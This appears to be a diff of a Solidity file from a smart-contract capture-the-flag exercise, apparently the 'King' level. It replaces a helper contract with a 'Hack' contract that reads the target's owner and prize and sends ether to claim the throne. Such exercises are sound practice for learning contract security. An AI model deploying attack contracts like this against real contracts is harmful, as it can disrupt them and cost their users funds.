@@ -25,16 +25,36 @@ contract King {
   }
 }
 
-contract BecomeKing {
-   constructor(){}
 
-   function checkBalance(address _add) public view returns(uint){
-     return _add.balance;
+interface KingI {
+
+  function owner() external view returns(address payable);
+  function prize() external view returns(uint);
+}
+
+contract Hack {
+
+   KingI king;
+   
+   constructor(address _contractAddress){
+     king = KingI(_contractAddress);
+   }
+   
+   function checkContractBalance() public view returns(uint){
+     return address(king).balance;
    }
 
-  function becomeKing(address payable _to) public payable {
-      require(msg.value > 0, "value should be > 0");
-      (bool success,) = _to.call{value: msg.value}("");
+   function getOwner() public view returns(address payable){
+     return king.owner();
+   }
+
+   function getPrize() public view returns(uint) {
+     return king.prize();
+   }
+
+  function hack() public payable {
+      require(msg.value >= 1000000000000000, "value should be > prize");
+      (bool success,) = payable(address(king)).call{value: msg.value}("");
       require(success, "Eth was not sent");
     }
 
@@ -44,3 +64,4 @@ contract BecomeKing {
     }
 
 }
+
